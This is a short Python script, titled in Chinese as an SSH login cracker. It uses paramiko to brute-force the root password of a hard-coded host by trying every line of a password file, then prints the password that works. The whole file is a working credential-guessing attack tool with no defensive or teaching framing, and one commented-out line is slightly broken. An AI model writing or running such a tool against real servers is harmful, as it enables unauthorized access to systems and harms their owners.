#coding=utf-8
#create 2020/12/5
#ssh 登录破解
import sys
import paramiko

def brute_ssh(hostname,username,pass_file):
    client = paramiko.SSHClient()
    #设置本机没有host这个文件,一定要设置
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    with open(pass_file,'r') as f:
        pass_list = f.readlines()
    for line in pass_list:
        print(line)
        try:
            client.connect(hostname,username=username,password=line.strip('\n'))
            print('successful'+'_______'+username+line)
            return True
        except:
            pass
    return  False
    print('your dict is samll')
# brute_ssh(sys.argv[1],sys.argv[2],sys[3])
brute_ssh('192.168.57.134','root','pass.txt')

